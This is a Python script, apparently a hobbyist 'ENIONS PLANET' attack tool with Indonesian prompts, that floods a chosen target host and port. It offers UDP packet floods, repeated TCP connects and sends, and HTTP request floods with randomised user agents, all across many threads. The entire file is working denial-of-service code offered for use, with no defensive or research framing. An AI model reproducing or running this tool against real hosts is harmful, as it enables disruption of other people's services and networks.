if __name__=='__main__':
    def main():
        from argparse import ArgumentParser
        parser=ArgumentParser()
        parser.add_argument('METHOD',help='The method to be used',nargs='?')
        parser.add_argument('TARGET',help='Target host',nargs='?')
        parser.add_argument('PORT',help='Target port',nargs='?')
        parser.add_argument('THREADS',help='Number of threads',nargs='?')
        parser.add_argument('COUNT',help='Number of packets that can be sent',nargs='?')
        parser.add_argument('NOANSI',help='If the colors have an error, the value in this argument must be True',nargs='?')
        args=parser.parse_args()
        NOANSI=bool(args.NOANSI)
        if not NOANSI:
            from colorama import Fore
            RESET=Fore.RESET
            RED=Fore.LIGHTRED_EX
            GREEN=Fore.LIGHTGREEN_EX
            CYAN=Fore.LIGHTCYAN_EX
            YELLOW=Fore.LIGHTYELLOW_EX
        else:
            RESET=''
            RED=''
            GREEN=''
            CYAN=''
            YELLOW=''
        print(
CYAN+f"""

███████╗███╗░░██╗██╗░█████╗░███╗░░██╗░██████╗
██╔════╝████╗░██║██║██╔══██╗████╗░██║██╔════╝
█████╗░░██╔██╗██║██║██║░░██║██╔██╗██║╚█████╗░
██╔══╝░░██║╚████║██║██║░░██║██║╚████║░╚═══██╗
███████╗██║░╚███║██║╚█████╔╝██║░╚███║██████╔╝
╚══════╝╚═╝░░╚══╝╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░
{RESET}Waktu Tempuh:{YELLOW}03:28{RESET}
Name Tools {YELLOW}ENIONS•PLANET✓✓✓
============================================
{RESET}Create Tanggal: {RED}11/{YELLOW}05/{GREEN}2023{RESET}
Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
""")
        if args.METHOD:METHOD=args.METHOD.upper()
        else:METHOD=input(RESET+f'[{GREEN}Masukan Methode Tools BIGENIONS/CONNECTS/CONNECTS2/BOTS{RESET}]: {GREEN}').upper()
        METHODS=['BIGENIONS','CONNECTS','CONNECTS2','BOTS','URL']
        print(RESET+" Checking the method...")
        if not METHOD in METHODS:
            print(RED+"Methode Tidak Di Termukan. There is available methods to use: "+", ".join([i for i in METHODS]))
            exit()
        if args.TARGET:TARGET=str(args.TARGET)
        else:TARGET=input(RESET+f'[{RED}Enter the target host (IP/URL){RESET}]: {RED}')
        if args.PORT:PORT=str(args.PORT)
        else:PORT=input(RESET+f'[{RED}Enter the port targets (PORT){RESET}]: {RED}')
        if args.THREADS:THREADS=int(args.THREADS)
        else:THREADS=int(input(RESET+f'[{CYAN}Enter The Number Threads{RESET}]: {CYAN}'))
        if args.COUNT:COUNT=int(args.COUNT)
        else:COUNT=int(input(RESET+f'[{CYAN}Enter The Number Packets{RESET}]: {CYAN}'))
        print(RESET+" Importing something...")
        from threading import Thread
        if METHOD in ['BIGENIONS','CONNECTS','CONNECTS2','BOTS']:from socket import socket,AF_INET
        elif METHOD in ['URL']:
            from getuseragent import UserAgent
            from urllib.request import Request,urlopen
        if METHOD in ['BIGENIONS']:from socket import SOCK_DGRAM
        elif METHOD in ['CONNECTS','CONNECTS2','BOTS']:from socket import SOCK_STREAM
        print(RESET+" Setting up...")
        if METHOD in ['BIGENIONS','CONNECTS','CONNECTS2','BOTS']:
            if METHOD in ['BIGENIONS']:s=socket(AF_INET,SOCK_DGRAM)
            host=TARGET.replace(":"," ").split()
            IP,PORT=host
            PORT=int(PORT)
        elif METHOD in ['URL']:ua=UserAgent(requestsPrefix=True)
        def __thread__():
            for x in range(COUNT):
                try:
                    if METHOD=="BIGENIONS":s.sendto(bytes(65500),(IP,PORT))
                    elif METHOD=="CONNECTS":socket(AF_INET,SOCK_STREAM).connect((IP,PORT))
                    elif METHOD=="CONNECTS2":
                        s=socket(AF_INET,SOCK_STREAM)
                        s.connect((IP,PORT))
                        s.close()
                    elif METHOD=="BOTS":
                        s=socket(AF_INET,SOCK_STREAM)
                        s.connect((IP,PORT))
                        s.send(bytes(50055))
                    elif METHOD=="URL":urlopen(Request(TARGET,headers=ua.Random()))
                except TimeoutError:pass
                except ConnectionRefusedError as e:
                    print(CYAN+f"Connection refused: {e}, exiting...")
                    exit()
                except OSError:pass
                except (KeyboardInterrupt,SystemError):exit()
                except Exception as e:print(f"An exception occurred in attack process: {e}")
        print(CYAN+f"  Attack started to {TARGET} with {METHOD} method.")
        for x in range(THREADS):
            Thread(target=__thread__).start()
            print(f' {GREEN}Attacking{RESET}, {YELLOW}starting threads... {RESET}({GREEN}{x}{RESET}/{THREADS} started)',end='\r')
        print(CYAN+f' {GREEN}Attacking{RESET}, {GREEN}all threads are started.',end='\r')
    try:main()
    except (KeyboardInterrupt,SystemExit):
        print('\n\nExiting...',end='\r')
        exit()
    except Exception as e:print(f'An exception occurred: {e}')